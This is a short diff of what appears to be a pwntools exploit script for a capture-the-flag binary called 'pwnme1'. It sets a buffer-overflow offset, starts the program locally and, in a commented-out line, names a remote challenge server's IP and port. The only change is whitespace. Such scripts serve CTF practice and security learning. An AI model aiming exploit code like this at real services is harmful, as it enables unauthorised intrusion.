@@ -41,7 +41,7 @@ bss_addr = elf.bss()
 offset = 0xa4 + 0x4
 
 io = process('./pwnme1')
-#  io = remote('104.224.169.128', 18889)
+# io = remote('104.224.169.128', 18889)
 
 io.recvuntil('Exit    \n')
 io.sendline('5')
